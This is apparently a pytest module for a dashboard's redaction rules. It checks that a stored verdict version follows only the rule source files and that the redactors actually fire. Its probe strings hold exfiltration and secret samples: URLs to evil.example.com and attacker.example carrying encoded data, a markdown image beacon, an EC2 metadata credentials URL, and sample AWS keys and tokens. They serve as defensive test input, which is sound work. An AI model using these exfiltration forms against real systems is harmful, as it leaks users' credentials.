"""The stored display-verdict rules version tracks the redaction rules and nothing else.

``display_verdicts`` keeps verdicts across restarts under a rules version. Two
failure modes, both pinned here:

* the version misses a file the battery's output depends on: a stored "clean"
  verdict outlives a rule change and shows a string the new rules would redact;
* the version covers files the battery does not depend on: every release
  invalidates every stored verdict and the feature is gone in practice.

So the version is a digest of ``display_battery.RULE_SOURCES``, and this module
proves (1) the battery executes only those package files, (2) those files import
nothing outside the list except named non-rule dependencies, (3) changing a rule
file changes the version and changing any other file does not.
"""

from __future__ import annotations

import ast
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from kiro_crew.dashboard import display_battery
from kiro_crew.dashboard import display_verdicts as dv

PKG = Path(display_battery.__file__).resolve().parent.parent

#: Package modules a rule source imports that are NOT rules inputs, and why.
NOT_RULES: dict[str, str] = {
    "kiro_crew.sel": "SEL audit records; the battery never writes one (trace below)",
    "kiro_crew.security.denied_rules": "bash-audit symbols exfil re-uses; never called by the battery",
    "kiro_crew.config": "operator OAuth file, banner-only (test_display_redaction_source_guard)",
    "kiro_crew.config.loader": "same; plus the owner-view switch path, which turns storage off",
    "kiro_crew.platform.context": "exempt-host source; its output, the host set, is in every tag",
    "kiro_crew.atomic_write": "the owner-view switch writer; never reached from the battery",
    "kiro_crew._facade_mirror": "mirror facade glue: runs at import and on attribute access only",
    "kiro_crew.security.exfil_bash": "the bash egress gate; the battery never calls it",
}

# Inputs that make every display redactor take its matching path.
PROBE = r"""
import json, os, sys
from pathlib import Path
from kiro_crew.dashboard import display_battery
from kiro_crew.security import exfil
from kiro_crew import slack_manifest

# The exempt-host source is keyed (its output is in every tag), so it is held
# fixed here and its own package files do not count as rules inputs.
exfil._exempt_exact_hosts = lambda: frozenset()

pkg = str(Path(display_battery.__file__).resolve().parent.parent)
texts = [
    "plain prose, nothing to redact",
    "key AKIAIOSFODNN7EXAMPLE secret wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "token=ghp_" + "a" * 36,
    "Authorization: Bearer " + "x1Y2z3" * 8,
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJlc2lnbmF0dXJl",
    "-----BEGIN RSA " + "PRIVATE KEY-----\nMIIEpAIBAAKCAQEA\n-----END RSA " + "PRIVATE KEY-----",
    "password: hunter2hunter2hunter2",
    "see https://evil.example.com/x?d=" + "QUJD" * 40,
    "![x](https://attacker.example/p?q=" + "a1b2" * 30 + ")",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + "Zm9v" * 12,
    "https://bucket.s3.amazonaws.com/k?X-Amz-Algorithm=AWS4-HMAC-SHA256"
    "&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20260101%2Fus-east-1%2Fs3%2Faws4_request"
    "&X-Amz-Date=20260101T000000Z&X-Amz-Expires=60&X-Amz-SignedHeaders=host"
    "&X-Amz-Signature=" + "ab" * 32,
    "https://x.example/%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52",
    slack_manifest.deep_link("alias_1"),
    "中文 текст " + "z" * 300,
]
seen = set()
def prof(frame, event, arg):
    if event == "call":
        fn = frame.f_code.co_filename
        if fn.startswith(pkg):
            seen.add(os.path.relpath(fn, pkg).replace(os.sep, "/"))
changed = 0
sys.setprofile(prof)
for t in texts:
    changed += display_battery.display_battery(t) != t
sys.setprofile(None)
print(json.dumps({"changed": changed, "n": len(texts), "files": sorted(seen)}))
"""


def _trace(tmp_path: Path) -> dict:
    env = {
        "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        "HOME": str(tmp_path),
        "PYTHONPATH": os.pathsep.join(p for p in sys.path if p),
        "PYTHONDONTWRITEBYTECODE": "1",
    }
    # Windows cannot initialise sockets (asyncio's import) without SYSTEMROOT.
    env.update({k: os.environ[k] for k in ("SYSTEMROOT", "WINDIR") if k in os.environ})
    out = subprocess.run(
        [sys.executable, "-c", PROBE],
        env=env,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=120,
        check=False,
    )
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout.strip().splitlines()[-1])


def test_the_battery_executes_only_rule_sources(tmp_path: Path) -> None:
    """A fresh interpreter (no warm memo can hide a call) runs nothing outside the list."""
    res = _trace(tmp_path)
    assert res["changed"] >= 8, "the probes must actually make the redactors fire"
    listed = {p for p in display_battery.RULE_SOURCES if p.endswith(".py")}
    assert set(res["files"]) <= listed, sorted(set(res["files"]) - listed)
    # The two engines are actually reached, so the check above is not vacuous.
    assert {"security/redaction.py", "security/exfil.py"} <= set(res["files"])


def _module_of(rel: str) -> str:
    return "kiro_crew." + rel[: -len(".py")].replace("/", ".").removesuffix(".__init__")


def _imports(rel: str) -> set[str]:
    mod = _module_of(rel)
    pkg = mod.rsplit(".", 1)[0]
    tree = ast.parse((PKG / rel).read_text(encoding="utf-8"))
    found: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            found |= {a.name for a in node.names}
        elif isinstance(node, ast.ImportFrom):
            if node.level:
                base = pkg.rsplit(".", node.level - 1)[0] if node.level > 1 else pkg
                name = f"{base}.{node.module}" if node.module else base
            else:
                name = node.module or ""
            found.add(name)
            # ``from kiro_crew import slack_manifest`` names a module.
            for a in node.names:
                found.add(f"{name}.{a.name}")
    return {n for n in found if n == "kiro_crew" or n.startswith("kiro_crew.")}


def test_rule_sources_import_nothing_unlisted() -> None:
    """Any package import of a rule source is a rule source or a named non-rule."""
    listed = {_module_of(p) for p in display_battery.RULE_SOURCES if p.endswith(".py")}
    known = {_module_of(p) for p in PKG.rglob("*.py") for p in [p.relative_to(PKG).as_posix()]}
    for rel in display_battery.RULE_SOURCES:
        if not rel.endswith(".py"):
            continue
        for name in _imports(rel):
            if name not in known:
                continue  # ``kiro_crew`` itself, or a symbol of an imported module
            assert name in listed or name in NOT_RULES, f"{rel} imports unlisted {name}"


def _copy(tmp_path: Path, extra: tuple[str, ...]) -> Path:
    root = tmp_path / "pkg"
    for rel in display_battery.RULE_SOURCES + extra:
        dst = root / rel
        dst.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(PKG / rel, dst)
    return root


OTHER_FILES = ("dashboard/chat_utils.py", "dashboard/display_verdicts.py", "sel.py", "cli.py")


def test_a_non_rule_file_change_keeps_the_digest(tmp_path: Path) -> None:
    root = _copy(tmp_path, OTHER_FILES)
    before = display_battery.rule_source_digest(root)
    assert before == display_battery.rule_source_digest()
    for rel in OTHER_FILES:
        with open(root / rel, "a", encoding="utf-8") as fh:
            fh.write("\n# edited\n")
    assert display_battery.rule_source_digest(root) == before


@pytest.mark.parametrize("rel", display_battery.RULE_SOURCES)
def test_every_rule_file_change_moves_the_digest(tmp_path: Path, rel: str) -> None:
    root = _copy(tmp_path, ())
    before = display_battery.rule_source_digest(root)
    with open(root / rel, "ab") as fh:
        fh.write(b"\n")
    assert display_battery.rule_source_digest(root) != before


def test_a_missing_rule_file_gives_no_digest(tmp_path: Path) -> None:
    root = _copy(tmp_path, ())
    (root / display_battery.RULE_SOURCES[1]).unlink()
    with pytest.raises(OSError):
        display_battery.rule_source_digest(root)


def test_the_rules_version_is_the_rule_digest_not_the_package(monkeypatch) -> None:
    """The version follows the rule digest and ignores the package code fingerprint."""
    import kiro_crew.code_fingerprint as cf

    base = dv.rules_version()
    assert dv.rules_version() == base
    cf.code_fingerprint.cache_clear()
    monkeypatch.setattr(cf, "code_fingerprint", lambda: "some-other-release")
    assert dv.rules_version() == base, "a release that leaves the rules alone keeps the version"

    other = b"\x01" * 32
    monkeypatch.setattr(display_battery, "rule_source_digest", lambda root=None: other)
    monkeypatch.setattr(display_battery, "LOADED_DIGEST", other)
    assert dv.rules_version() != base, "a rule change moves the version"


def test_rules_edited_after_load_store_nothing(monkeypatch) -> None:
    """On-disk rules that differ from the loaded ones give no version, so enable stays off."""
    monkeypatch.setattr(display_battery, "LOADED_DIGEST", b"\x02" * 32)
    with pytest.raises(RuntimeError):
        dv.rules_version()
